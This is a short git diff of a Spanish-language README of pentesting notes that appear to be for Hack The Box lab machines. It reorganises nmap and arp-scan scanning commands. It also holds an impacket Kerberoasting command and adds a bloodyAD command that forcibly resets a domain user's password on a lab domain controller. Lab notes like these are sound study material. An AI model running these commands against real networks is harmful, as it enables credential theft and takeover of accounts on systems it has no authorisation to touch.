@@ -6,8 +6,9 @@
 ## Requisitos
 
 - **Nmap**: Asegúrate de tener instalado Nmap para realizar escaneos de puertos. Puedes instalarlo y ejecutar el siguiente flujo de comandos:
-sudo arp-scan --interface=eth0 --localnet
+
   ```bash
+  sudo arp-scan --interface=eth0 --localnet
   # Escaneo completo de todos los puertos
   sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 192.168.1.1 -oG allPorts
   
@@ -21,3 +22,4 @@ sudo arp-scan --interface=eth0 --localnet
 
 ```bash
 sudo faketime "$(ntpdate -q dc01.fluffy.htb | cut -d ' ' -f 1,2)" impacket-GetUserSPNs fluffy.htb/p.agila -dc-ip 10.10.11.69 -request
+faketime -f "2025-06-24 09:42:03" bloodyAD -d scepter.htb -u d.baker -k --host dc01.scepter.htb --dc-ip 10.10.11.65 set password a.carter Password123
